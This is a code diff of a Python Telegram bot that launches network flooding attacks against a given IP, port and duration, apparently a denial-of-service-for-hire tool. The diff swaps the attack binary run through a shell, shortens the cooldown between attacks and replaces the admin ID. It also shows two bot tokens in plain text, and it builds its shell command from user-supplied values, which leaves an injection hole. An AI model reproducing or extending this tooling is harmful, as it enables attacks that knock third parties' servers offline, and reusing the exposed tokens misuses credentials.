@@ -5,8 +5,8 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 from telegram.error import TelegramError
 
-TELEGRAM_BOT_TOKEN = '7248587968:AAHt1bxti3sXmVc1QsvP9oupMdrBwu38H2k'
-ADMIN_USER_ID = 6712658978  
+TELEGRAM_BOT_TOKEN = '7248587968:AAEsQFgweeIhsRwMH4nD2uKINX_DGpzpGaQ'
+ADMIN_USER_ID = 6539807903  
 bot_access_free = True
 
 # Store attacked IPs to prevent duplicate attacks
@@ -16,7 +16,7 @@ attacked_ips = set()
 MAX_ATTACK_DURATION = 240
 
 # Cooldown period (in seconds) after an attack is initiated
-COOLDOWN_PERIOD = 100
+COOLDOWN_PERIOD = 50
 
 # Dictionary to store allowed users and their expiry timestamp.
 # If expiry is None, then access never expires.
@@ -57,7 +57,7 @@ async def start(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./RK {ip} {port} {duration} 900",
+            f"./bgmi {ip} {port} {duration}",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
